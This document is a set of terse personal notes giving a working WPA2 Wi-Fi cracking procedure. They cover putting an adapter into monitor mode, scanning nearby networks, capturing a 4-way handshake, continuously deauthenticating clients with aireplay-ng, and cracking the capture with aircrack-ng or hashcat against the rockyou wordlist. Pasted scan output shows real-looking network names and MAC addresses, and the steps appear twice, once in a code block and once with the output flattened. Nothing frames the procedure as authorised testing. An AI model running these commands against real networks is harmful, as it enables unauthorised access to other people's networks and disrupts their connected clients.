# Step 1:

Kill interfering processes and put adapter in monitor mode  
$sudo airmon-ng check kill  
$sudo airmon-ng start wlan0
 
# Step 2:

Discovery  
$sudo airodump-ng wlan0
 
```
┌──(kali㉿kali)-[~]  
└─$ sudo airodump-ng wlan0      


 CH 10 ][ Elapsed: 3 mins ][ 2023-01-10 20:26 ][ paused output                                                                                                
                                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                              
                                                                                                                                                              
 98:E7:F4:9F:D5:9B  -75        0        0    0  11   65   WPA2 CCMP   PSK  DIRECT-9A-HP OfficeJet 4650                                                        
 1E:9D:72:BD:09:05  -83        3        0    0   6  260   WPA2 CCMP   PSK  <length:  0>                                                                       
 F4:30:B9:00:9F:0E  -76        2        0    0   6   65   WPA2 CCMP   PSK  DIRECT-0D-HP ENVY 7640 series                                                      
 40:E1:E4:3E:F1:4D  -78        6        0    0   6  720   WPA2 CCMP   PSK  Bismuth                                                                            
 06:1E:A3:6F:71:56   -1        0        0    0   6   -1                    <length:  0>                                                                       
 5A:96:30:95:92:CE  -80        8        0    0   6  260   WPA2 CCMP   MGT  <length:  0>                                                                       
 1E:9D:72:BD:09:07  -81        4        0    0   6  260   WPA3 CCMP   SAE  <length:  0>                                                                       
 1E:9D:72:BD:09:01  -82        3        0    0   6  260   WPA2 CCMP   MGT  <length:  0>                                                                       
 5A:96:30:95:92:CA  -81        8        0    0   6  260   WPA2 CCMP   PSK  <length:  0>                                                                       
             
Take note of BSSID and channel

$sudo airodump-ng wlan0mon -d <BSSID> -c <channel>

 CH  6 ][ Elapsed: 2 mins ][ 2023-01-10 21:06 ][ paused output                                                                                                
                                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                          
                                                                                                                                                              
 40:E1:E4:3E:F1:4D  -75   0       12       33    0   6  720   WPA2 CCMP   PSK  Bismuth                                                                        
                                                                                                                                                              
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                            
                                                                                                                                                              
 40:E1:E4:3E:F1:4D  26:8E:F8:70:D6:20   -1    2e- 0      0       26        
Capture WPA2 4-way handshake
$sudo airodump-ng -w <path> -c <channel> -d <bssid> wlan0

Deauth all client continuously 
--deauth <number of deauth packets to send>
-a <AP MAC>
-c (optional) <CLIENT MAC>
$sudo aireplay-ng --deauth 0 -a <bssid> -c <client mac> wlan0

Until - [ WPA handshake: 74:DA:88:BC:B9:43    

Crack handshake capture with aircrack
$sudo aircrack-ng <path to .cap> -w /usr/share/wordlists/rockyou.txt

OR 

Convert .cap to correct extention ([https://hashcat.net/cap2hashcat/index.pl](https://hashcat.net/cap2hashcat/index.pl))
Send file to windows
Cmd  
$cd S:\hashcat\hashcat-6.2.6  
$hashcat.exe -a 0 -D 2 <path to file .hc22000> C:\Users\barry\OneDrive\Desktop\rockyou.txt


```
 
CH 10 ][ Elapsed: 3 mins ][ 2023-01-10 20:26 ][ paused output   BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID   98:E7:F4:9F:D5:9B -75 0 0 0 11 65 WPA2 CCMP PSK DIRECT-9A-HP OfficeJet 4650  
1E:9D:72:BD:09:05 -83 3 0 0 6 260 WPA2 CCMP PSK <length: 0>  
F4:30:B9:00:9F:0E -76 2 0 0 6 65 WPA2 CCMP PSK DIRECT-0D-HP ENVY 7640 series  
==40:E1:E4:3E:F1:4D== -78 6 0 0 ==6== 720 WPA2 CCMP PSK Bismuth  
06:1E:A3:6F:71:56 -1 0 0 0 6 -1 <length: 0>  
5A:96:30:95:92:CE -80 8 0 0 6 260 WPA2 CCMP MGT <length: 0>  
1E:9D:72:BD:09:07 -81 4 0 0 6 260 WPA3 CCMP SAE <length: 0>  
1E:9D:72:BD:09:01 -82 3 0 0 6 260 WPA2 CCMP MGT <length: 0>  
5A:96:30:95:92:CA -81 8 0 0 6 260 WPA2 CCMP PSK <length: 0>   Take note of BSSID and channel
 
# Step 3 (optional):

- This step is useful if you want to see clients connected

$sudo airodump-ng wlan0mon -d <BSSID> -c <channel>
 
CH 6 ][ Elapsed: 2 mins ][ 2023-01-10 21:06 ][ paused output   BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID   40:E1:E4:3E:F1:4D -75 0 12 33 0 6 720 WPA2 CCMP PSK Bismuth   BSSID STATION PWR Rate Lost Frames Notes Probes   40:E1:E4:3E:F1:4D 26:8E:F8:70:D6:20 -1 2e- 0 0 26  

# Step 4:

- Capture WPA2 4-way handshake

$sudo airodump-ng -w <path> -c <channel> -d <bssid> wlan0
      

# Step 5:

- Deauth all client continuously
- --deauth <number of deauth packets to send>
- -a <AP MAC>
- -c (optional) <CLIENT MAC>

$sudo aireplay-ng --deauth 0 -a <bssid> -c <client mac> wlan0
 
Until - [ WPA handshake: 74:DA:88:BC:B9:43
 
# Step 6:

- Crack handshake capture with aircrack

$sudo aircrack-ng <path to .cap> -w /usr/share/wordlists/rockyou.txt
 
OR
 
- Convert .cap to correct extention ([https://hashcat.net/cap2hashcat/index.pl](https://hashcat.net/cap2hashcat/index.pl))
- Send file to windows

Cmd  
$cd S:\hashcat\hashcat-6.2.6  
$hashcat.exe -a 0 -D 2 <path to file .hc22000> C:\Users\barry\OneDrive\Desktop\rockyou.txt